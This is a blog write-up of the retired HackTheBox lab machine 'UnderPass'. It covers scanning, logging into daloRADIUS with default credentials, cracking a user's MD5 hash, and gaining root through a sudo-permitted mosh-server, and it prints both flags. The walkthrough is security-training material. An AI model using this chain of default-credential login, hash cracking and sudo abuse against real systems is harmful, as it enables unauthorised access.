@@ -1,0 +1,151 @@
+<!doctype html><html data-theme=dark lang=en xmlns=http://www.w3.org/1999/xhtml><head><meta charset=UTF-8><meta name=description><meta content="width=device-width,initial-scale=1" name=viewport><meta content=#9a9996 name=theme-color><meta content=#20c20e media=(prefers-color-scheme:dark) name=theme-color><title>️📦 HackTheBox: UnderPass - psypherpunk::blog</title><link href=https://blog.psypherpunk.io/blog/htb-machine-easy-underpass/ rel=canonical><link href=https://blog.psypherpunk.io/favicon.png rel=icon type=image/png><link href=https://blog.psypherpunk.io/apple-touch-icon.png rel=apple-touch-icon sizes=180x180 type=image/png><link title="psypherpunk::blog - RSS Feed" href=https://blog.psypherpunk.io/rss.xml rel=alternate type=application/rss+xml><link title="psypherpunk::blog - Atom Feed" href=https://blog.psypherpunk.io/atom.xml rel=alternate type=application/atom+xml><style>:root{--accent-color:#6f8396}[data-theme=dark]{--accent-color:#20c20e}@media (prefers-color-scheme:dark){:root:not([data-theme=light]){--accent-color:#20c20e}}</style><link href=https://blog.psypherpunk.io/style.css rel=stylesheet><script defer src=https://blog.psypherpunk.io/closable.js></script><meta content=psypherpunk::blog property=og:site_name><meta content="️📦 HackTheBox: UnderPass - psypherpunk::blog" property=og:title><meta content=https://blog.psypherpunk.io/blog/htb-machine-easy-underpass/ property=og:url><meta content="HackTheBox | Machines | Easy | UnderPass" property=og:description><meta content=https://blog.psypherpunk.io/card.png property=og:image><meta content=en_US property=og:locale><body><header id=site-nav><nav><a href=#main-content tabindex=0> Skip to Main Content </a><ul><li id=home><a href=https://blog.psypherpunk.io> <i class=icon></i>psypherpunk::blog</a><li class=divider><li><a href=https://blog.psypherpunk.io/blog/>Blog</a><li id=feed><details class=closable><summary class=circle title=Feed><i class=icon></i></summary> <ul><li><a href=https://blog.psypherpunk.io/rss.xml>RSS</a><li><a href=https://blog.psypherpunk.io/atom.xml>Atom</a></ul></details></ul></nav></header><main id=main-content><article><div id=heading><p><small> <time datetime=" 2025-05-11T00:00:00+00:00">Published on May 11, 2025</time></small><h1>️📦 HackTheBox: UnderPass</h1><ul class=tags><li><a class=tag href=https://blog.psypherpunk.io/tags/hackthebox/>hackthebox</a><li><a class=tag href=https://blog.psypherpunk.io/tags/udp/>udp</a><li><a class=tag href=https://blog.psypherpunk.io/tags/radius/>radius</a><li><a class=tag href=https://blog.psypherpunk.io/tags/mosh/>mosh</a></ul><ul class=tags><li><a class=tag href=https://blog.psypherpunk.io/categories/hackthebox/>hackthebox</a></ul></div><div id=buttons-container><a title="Go to Top" href=#top id=go-to-top><i class=icon></i></a></div><p><a href=https://app.hackthebox.com/machines/UnderPass>UnderPass</a> is the most recently retired of HackTheBox’s machines and one that I’m not ashamed to admit took me far too long to solve.</p><span id=continue-reading></span><pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>❯</span><span> rustscan</span><span style=color:#bf616a> --addresses</span><span> 10.10.11.48 -- -sCV -Pn
+</span><span style=color:#bf616a>.----.</span><span> .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+</span><span>| </span><span style=color:#bf616a>{</span><span>}  }| { } |{ </span><span style=color:#bf616a>{__ </span><span>{_   _}{ {__  /  ___} / {} </span><span style=color:#96b5b4>\ </span><span>|  `| |
+</span><span>| </span><span style=color:#bf616a>.-. </span><span style=color:#96b5b4>\| </span><span>{_} |</span><span style=color:#bf616a>.-._</span><span>} } | |  </span><span style=color:#bf616a>.-._</span><span>} }</span><span style=color:#96b5b4>\     </span><span>}</span><span style=color:#bf616a>/</span><span>  /</span><span style=color:#96b5b4>\  \| </span><span>|</span><span style=color:#96b5b4>\  </span><span>|
+</span><span>`-'</span><span style=color:#a3be8c> `-</span><span>'`</span><span style=color:#bf616a>-----</span><span>'</span><span style=color:#a3be8c>`----</span><span>'  `-'</span><span style=color:#a3be8c>  `----</span><span>'  `</span><span style=color:#bf616a>---</span><span>'</span><span style=color:#a3be8c> `-</span><span>'  `-'</span><span style=color:#a3be8c>`-</span><span>' `</span><span style=color:#bf616a>-</span><span>'
+</span><span style=color:#a3be8c>The Modern Day Port Scanner.
+</span><span style=color:#a3be8c>________________________________________
+</span><span style=color:#a3be8c>: http://discord.skerritt.blog         :
+</span><span style=color:#a3be8c>: https://github.com/RustScan/RustScan :
+</span><span style=color:#a3be8c> --------------------------------------
+</span><span style=color:#a3be8c>Port scanning: Making networking exciting since... whenever.
+</span><span style=color:#a3be8c>
+</span><span style=color:#a3be8c>[~] The config file is expected to be at "/home/psypherpunk/.rustscan.toml"
+</span><span style=color:#a3be8c>[~] Automatically increasing ulimit value to 5000.
+</span><span style=color:#a3be8c>Open 10.10.11.48:22
+</span><span style=color:#a3be8c>Open 10.10.11.48:80
+</span><span style=color:#a3be8c>[~] Starting Script(s)
+</span><span style=color:#a3be8c>[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sCV -Pn" on ip 10.10.11.48
+</span><span style=color:#a3be8c>Depending on the complexity of the script, results may take some time to appear.
+</span><span style=color:#a3be8c>[~] Starting Nmap 7.94 ( https://nmap.org ) at 2024-12-23 21:07 GMT
+</span><span style=color:#a3be8c>NSE: Loaded 156 scripts for scanning.
+</span><span style=color:#a3be8c>NSE: Script Pre-scanning.
+</span><span style=color:#a3be8c>NSE: Starting runlevel 1 (of 3) scan.
+</span><span style=color:#a3be8c>Initiating NSE at 21:07
+</span><span style=color:#a3be8c>Completed NSE at 21:07, 0.00s elapsed
+</span><span style=color:#a3be8c>NSE: Starting runlevel 2 (of 3) scan.
+</span><span style=color:#a3be8c>Initiating NSE at 21:07
+</span><span style=color:#a3be8c>Completed NSE at 21:07, 0.00s elapsed
+</span><span style=color:#a3be8c>NSE: Starting runlevel 3 (of 3) scan.
+</span><span style=color:#a3be8c>Initiating NSE at 21:07
+</span><span style=color:#a3be8c>Completed NSE at 21:07, 0.00s elapsed
+</span><span style=color:#a3be8c>Initiating Parallel DNS resolution of 1 host. at 21:07
+</span><span style=color:#a3be8c>Completed Parallel DNS resolution of 1 host. at 21:07, 0.01s elapsed
+</span><span style=color:#a3be8c>DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+</span><span style=color:#a3be8c>Initiating Connect Scan at 21:07
+</span><span style=color:#a3be8c>Scanning 10.10.11.48 [2 ports]
+</span><span style=color:#a3be8c>Discovered open port 22/tcp on 10.10.11.48
+</span><span style=color:#a3be8c>Discovered open port 80/tcp on 10.10.11.48
+</span><span style=color:#a3be8c>Completed Connect Scan at 21:07, 0.04s elapsed (2 total ports)
+</span><span style=color:#a3be8c>Initiating Service scan at 21:07
+</span><span style=color:#a3be8c>Scanning 2 services on 10.10.11.48
+</span><span style=color:#a3be8c>Completed Service scan at 21:07, 6.09s elapsed (2 services on 1 host)
+</span><span style=color:#a3be8c>NSE: Script scanning 10.10.11.48.
+</span><span style=color:#a3be8c>NSE: Starting runlevel 1 (of 3) scan.
+</span><span style=color:#a3be8c>Initiating NSE at 21:07
+</span><span style=color:#a3be8c>Completed NSE at 21:07, 1.53s elapsed
+</span><span style=color:#a3be8c>NSE: Starting runlevel 2 (of 3) scan.
+</span><span style=color:#a3be8c>Initiating NSE at 21:07
+</span><span style=color:#a3be8c>Completed NSE at 21:07, 0.17s elapsed
+</span><span style=color:#a3be8c>NSE: Starting runlevel 3 (of 3) scan.
+</span><span style=color:#a3be8c>Initiating NSE at 21:07
+</span><span style=color:#a3be8c>Completed NSE at 21:07, 0.00s elapsed
+</span><span style=color:#a3be8c>Nmap scan report for 10.10.11.48
+</span><span style=color:#a3be8c>Host is up, received user-set (0.020s latency).
+</span><span style=color:#a3be8c>Scanned at 2024-12-23 21:07:27 GMT for 7s
+</span><span style=color:#a3be8c>
+</span><span style=color:#a3be8c>PORT   STATE SERVICE REASON  VERSION
+</span><span style=color:#a3be8c>22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+</span><span style=color:#a3be8c>| ssh-hostkey:
+</span><span style=color:#a3be8c>|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
+</span><span style=color:#a3be8c>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK+kvbyNUglQLkP2Bp7QVhfp7EnRWMHVtM7xtxk34WU5s+lYksJ07/lmMpJN/bwey1SVpG0FAgL0C/+2r71XUEo=
+</span><span style=color:#a3be8c>|   256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
+</span><span style=color:#a3be8c>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ8XNCLFSIxMNibmm+q7mFtNDYzoGAJ/vDNa6MUjfU91
+</span><span style=color:#a3be8c>80/tcp open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
+</span><span style=color:#a3be8c>| http-methods:
+</span><span style=color:#a3be8c>|_  Supported Methods: POST OPTIONS HEAD GET
+</span><span style=color:#a3be8c>|_http-title: Apache2 Ubuntu Default Page: It works
+</span><span style=color:#a3be8c>|_http-server-header: Apache/2.4.52 (Ubuntu)
+</span><span style=color:#a3be8c>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span><span style=color:#a3be8c>
+</span><span style=color:#a3be8c>NSE: Script Post-scanning.
+</span><span style=color:#a3be8c>NSE: Starting runlevel 1 (of 3) scan.
+</span><span style=color:#a3be8c>Initiating NSE at 21:07
+</span><span style=color:#a3be8c>Completed NSE at 21:07, 0.00s elapsed
+</span><span style=color:#a3be8c>NSE: Starting runlevel 2 (of 3) scan.
+</span><span style=color:#a3be8c>Initiating NSE at 21:07
+</span><span style=color:#a3be8c>Completed NSE at 21:07, 0.00s elapsed
+</span><span style=color:#a3be8c>NSE: Starting runlevel 3 (of 3) scan.
+</span><span style=color:#a3be8c>Initiating NSE at 21:07
+</span><span style=color:#a3be8c>Completed NSE at 21:07, 0.00s elapsed
+</span><span style=color:#a3be8c>Read data files from: /usr/bin/../share/nmap
+</span><span style=color:#a3be8c>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span><span style=color:#a3be8c>Nmap done: 1 IP address (1 host up) scanned in 8.31 seconds
+</span></code></pre><p>The website running on 80 has…<em>nothing</em>: it’s a bare Apache placeholder.<p>At this point I admit to having been stumped: no amount of fuzzing or content-discovery turned up anything relevant.<p>…until I considered the name of the box: <em>UnderPass</em>. UnDerPass. UDP.<p>FFS…<p>For the sake of brevity (UDP scans are sloooooow), there’s one port open:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>❯</span><span> sudo nmap</span><span style=color:#bf616a> -sU -p</span><span> 161</span><span style=color:#bf616a> -Pn -sCV</span><span> 10.10.11.48
+</span><span style=color:#bf616a>Starting</span><span> Nmap 7.94 ( https://nmap.org ) </span><span style=color:#bf616a>at</span><span> 2024-12-23 23:34 GMT
+</span><span style=color:#bf616a>Nmap</span><span> scan report for 10.10.11.48
+</span><span style=color:#bf616a>Host</span><span> is up (0.017s latency)</span><span style=color:#96b5b4>.
+</span><span>
+</span><span style=color:#bf616a>PORT</span><span>    STATE SERVICE VERSION
+</span><span style=color:#bf616a>161/udp</span><span> open  snmp    SNMPv1 server; </span><span style=color:#bf616a>net-snmp</span><span> SNMPv3 server (public)
+</span><span>| </span><span style=color:#bf616a>snmp-info:
+</span><span>|   </span><span style=color:#bf616a>enterprise:</span><span> net-snmp
+</span><span>|   </span><span style=color:#bf616a>engineIDFormat:</span><span> unknown
+</span><span>|   </span><span style=color:#bf616a>engineIDData:</span><span> c7ad5c4856d1cf6600000000
+</span><span>|   </span><span style=color:#bf616a>snmpEngineBoots:</span><span> 29
+</span><span>|</span><span style=color:#bf616a>_</span><span>  snmpEngineTime: 2h29m33s
+</span><span>| </span><span style=color:#bf616a>snmp-sysdescr:</span><span> Linux underpass 5.15.0-126-generic </span><span style=color:#65737e>#136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
+</span><span>|</span><span style=color:#bf616a>_</span><span>  System uptime: 2h29m32.70s (897270 timeticks)
+</span><span style=color:#bf616a>Service</span><span> Info: Host: UnDerPass.htb is the only daloradius server in the basin!
+</span></code></pre><p><code>daloradius</code>? So that’s a <a href=https://github.com/lirantal/daloradius>thing</a>:<blockquote><p><em>“daloRADIUS is an advanced RADIUS web management application for managing hotspots and general-purpose ISP deployments.”</em></blockquote><blockquote class=tip><p class=alert-title><i class=icon></i>Tip<p>For reference, <a href=https://en.wikipedia.org/wiki/RADIUS>RADIUS</a> itself:<blockquote><p><em>“…is a networking protocol that provides centralized authentication, authorization, and accounting…”</em></blockquote></blockquote><p>A little searching turns up an article on <a href=https://green.cloud/docs/how-to-install-freeradius-and-daloradius-on-ubuntu-22-04/><em>How to install FreeRADIUS and Daloradius on Ubuntu 22.04</em></a> which suggests <code>/daloradius/app/operators</code> and, thankfully, yields a login page.<p>Furthermore, the same article lists the default credentials:<blockquote><p><code>Username: administrator</code><br> <code>Password: radius</code></blockquote><p>…which allow authentication on the aforementioned login page.<p>There’s a <em>Go to users list</em> button which shows one user: <code>svcMosh</code> and an apparent password of <code>412DD4759978ACFCC81DEAB01B382403</code>. <a href=https://crackstation.net/>CrackStation</a> reveals that to be the MD5 of <code>underwaterfriends</code>.<p>Armed with a username and password, it’s now possible to authenticate via SSH:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>❯</span><span> sshpass</span><span style=color:#bf616a> -p</span><span> underwaterfriends ssh svcMosh@10.10.11.48
+</span><span style=color:#bf616a>Welcome</span><span> to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)
+</span><span>
+</span><span style=color:#bf616a>…
+</span></code></pre><p>…and grab the user flag:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>svcMosh@underpass:~$</span><span> cat user.txt
+</span><span style=color:#bf616a>3ab9794834a603438334dab0064b3f49
+</span></code></pre><p>The <code>svcMosh</code> user has <code>sudo</code> privileges:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>svcMosh@underpass:~$</span><span> sudo</span><span style=color:#bf616a> -l
+</span><span style=color:#bf616a>Matching</span><span> Defaults entries for svcMosh on localhost:
+</span><span>    </span><span style=color:#bf616a>env_reset,</span><span> mail_badpass, secure_path=/usr/local/sbin</span><span style=color:#96b5b4>\:</span><span>/usr/local/bin</span><span style=color:#96b5b4>\:</span><span>/usr/sbin</span><span style=color:#96b5b4>\:</span><span>/usr/bin</span><span style=color:#96b5b4>\:</span><span>/sbin</span><span style=color:#96b5b4>\:</span><span>/bin</span><span style=color:#96b5b4>\:</span><span>/snap/bin, use_pty
+</span><span>
+</span><span style=color:#bf616a>User</span><span> svcMosh may run the following commands on localhost:
+</span><span>    (</span><span style=color:#bf616a>ALL</span><span>) NOPASSWD: /usr/bin/mosh-server
+</span></code></pre><p><code>mosh-server</code> is a “server-side helper for mosh”, the latter being <a href=https://mosh.org/>“Mosh: the mobile shell”</a>. Among its various uses, one can start a server, binding to a UDP port:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>svcMosh@underpass:~$</span><span> sudo /usr/bin/mosh-server new</span><span style=color:#bf616a> -p</span><span> 1337
+</span><span>
+</span><span>
+</span><span style=color:#bf616a>MOSH</span><span> CONNECT 1337 vBTv9ZfL5FT1TF896btNVA
+</span><span>
+</span><span style=color:#bf616a>mosh-server</span><span> (mosh 1.3.2) </span><span style=color:#bf616a>[build</span><span> mosh 1.3.2]
+</span><span style=color:#bf616a>Copyright</span><span> 2012 Keith Winstein &lt;mosh-devel@mit.edu>
+</span><span style=color:#bf616a>License</span><span> GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html>.
+</span><span style=color:#bf616a>This</span><span> is free software: you are free to change and redistribute it.
+</span><span style=color:#bf616a>There</span><span> is NO WARRANTY, to the extent permitted by law.
+</span><span>
+</span><span style=color:#bf616a>[mosh-server</span><span> detached, pid = 2205]
+</span></code></pre><p>That seemingly starts the service, while detaching. <code>mosh-server</code>, of course, has a counterpart in <code>mosh-client</code>. Making note of the above output:<blockquote><p><em>The 22-byte base64 session key given by mosh-server is supplied in the MOSH_KEY environment variable. This represents a 128-bit AES key that protects the integrity and confidentiality of the session.</em></blockquote><p>…and connecting the <code>mosh-server</code> now running via <code>sudo</code>:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>svcMosh@underpass:~$</span><span> MOSH_KEY=vBTv9ZfL5FT1TF896btNVA mosh-client 127.0.0.1 1337
+</span><span style=color:#bf616a>Welcome</span><span> to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)
+</span><span>
+</span><span> </span><span style=color:#bf616a>*</span><span> Documentation:  https://help.ubuntu.com
+</span><span> </span><span style=color:#bf616a>*</span><span> Management:     https://landscape.canonical.com
+</span><span> </span><span style=color:#bf616a>*</span><span> Support:        https://ubuntu.com/pro
+</span><span>
+</span><span> </span><span style=color:#bf616a>System</span><span> information as of Thu Dec 19 01:40:28 PM UTC 2024
+</span><span>
+</span><span>  </span><span style=color:#bf616a>System</span><span> load:  0.05              Processes:             251
+</span><span>  </span><span style=color:#bf616a>Usage</span><span> of /:   84.2% of 3.75GB   Users logged in:       0
+</span><span>  </span><span style=color:#bf616a>Memory</span><span> usage: 9%                IPv4 address for eth0: 10.10.11.48
+</span><span>  </span><span style=color:#bf616a>Swap</span><span> usage:   0%
+</span><span>
+</span><span>
+</span><span style=color:#bf616a>Expanded</span><span> Security Maintenance for Applications is not enabled.
+</span><span>
+</span><span style=color:#bf616a>0</span><span> updates can be applied immediately.
+</span><span>
+</span><span style=color:#bf616a>Enable</span><span> ESM Apps to receive additional future security updates.
+</span><span style=color:#bf616a>See</span><span> https://ubuntu.com/esm or run: sudo pro status
+</span><span>
+</span><span>
+</span><span style=color:#bf616a>The</span><span> list of available updates is more than a week old.
+</span><span style=color:#bf616a>To</span><span> check for new updates run: sudo apt update
+</span></code></pre><p>Having effectively connected to a <code>root</code> session, it’s now possible to grab the root flag:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>root@underpass:~#</span><span> cat /root/root.txt
+</span><span style=color:#bf616a>0e6a4749b8351bf77ef805282888a3ca
+</span></code></pre></article><hr><nav id=post-nav><a class="post-nav-item post-nav-prev" href=https://blog.psypherpunk.io/blog/metactf-january-2025-flash-ctf/> <div class=nav-arrow>Previous</div> <span class=post-title>️🏴 MetaCTF January 2025 Flash CTF</span> </a><a class="post-nav-item post-nav-next" href=https://blog.psypherpunk.io/blog/404-on-the-dancefloor/> <div class=nav-arrow>Next</div> <span class=post-title>️🏴 404 on the Dancefloor</span> </a></nav></main><footer id=site-footer><nav><ul><li><a href=https://blog.psypherpunk.io/blog/>Blog</a></ul></nav><p>© 2025 PsypherPunk<ul id=socials><li><a rel=" me" href=https://github.com/PsypherPunk title=GitHub> <i style="--icon:url(&#34;data:image/svg+xml,%3Csvg role='img' viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3EGitHub%3C/title%3E%3Cpath d='M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12'/%3E%3C/svg%3E&#34;)" class=icon></i> <span>GitHub</span> </a><li><a rel=" me" href=https://hachyderm.io/@psypherpunk title=Mastodon> <i style="--icon:url(&#34;data:image/svg+xml,%3Csvg role='img' viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3EMastodon%3C/title%3E%3Cpath d='M23.268 5.313c-.35-2.578-2.617-4.61-5.304-5.004C17.51.242 15.792 0 11.813 0h-.03c-3.98 0-4.835.242-5.288.309C3.882.692 1.496 2.518.917 5.127.64 6.412.61 7.837.661 9.143c.074 1.874.088 3.745.26 5.611.118 1.24.325 2.47.62 3.68.55 2.237 2.777 4.098 4.96 4.857 2.336.792 4.849.923 7.256.38.265-.061.527-.132.786-.213.585-.184 1.27-.39 1.774-.753a.057.057 0 0 0 .023-.043v-1.809a.052.052 0 0 0-.02-.041.053.053 0 0 0-.046-.01 20.282 20.282 0 0 1-4.709.545c-2.73 0-3.463-1.284-3.674-1.818a5.593 5.593 0 0 1-.319-1.433.053.053 0 0 1 .066-.054c1.517.363 3.072.546 4.632.546.376 0 .75 0 1.125-.01 1.57-.044 3.224-.124 4.768-.422.038-.008.077-.015.11-.024 2.435-.464 4.753-1.92 4.989-5.604.008-.145.03-1.52.03-1.67.002-.512.167-3.63-.024-5.545zm-3.748 9.195h-2.561V8.29c0-1.309-.55-1.976-1.67-1.976-1.23 0-1.846.79-1.846 2.35v3.403h-2.546V8.663c0-1.56-.617-2.35-1.848-2.35-1.112 0-1.668.668-1.67 1.977v6.218H4.822V8.102c0-1.31.337-2.35 1.011-3.12.696-.77 1.608-1.164 2.74-1.164 1.311 0 2.302.5 2.962 1.498l.638 1.06.638-1.06c.66-.999 1.65-1.498 2.96-1.498 1.13 0 2.043.395 2.74 1.164.675.77 1.012 1.81 1.012 3.12z'/%3E%3C/svg%3E&#34;)" class=icon></i> <span>Mastodon</span> </a><li><a rel=" me" href=https://twitter.com/PsypherPunk title=Twitter> <i style="--icon:url(&#34;data:image/svg+xml,%3Csvg role='img' viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3ETwitter%3C/title%3E%3Cpath d='M21.543 7.104c.015.211.015.423.015.636 0 6.507-4.954 14.01-14.01 14.01v-.003A13.94 13.94 0 0 1 0 19.539a9.88 9.88 0 0 0 7.287-2.041 4.93 4.93 0 0 1-4.6-3.42 4.916 4.916 0 0 0 2.223-.084A4.926 4.926 0 0 1 .96 9.167v-.062a4.887 4.887 0 0 0 2.235.616A4.928 4.928 0 0 1 1.67 3.148 13.98 13.98 0 0 0 11.82 8.292a4.929 4.929 0 0 1 8.39-4.49 9.868 9.868 0 0 0 3.128-1.196 4.941 4.941 0 0 1-2.165 2.724A9.828 9.828 0 0 0 24 4.555a10.019 10.019 0 0 1-2.457 2.549z'/%3E%3C/svg%3E&#34;)" class=icon></i> <span>Twitter</span> </a></ul></footer>
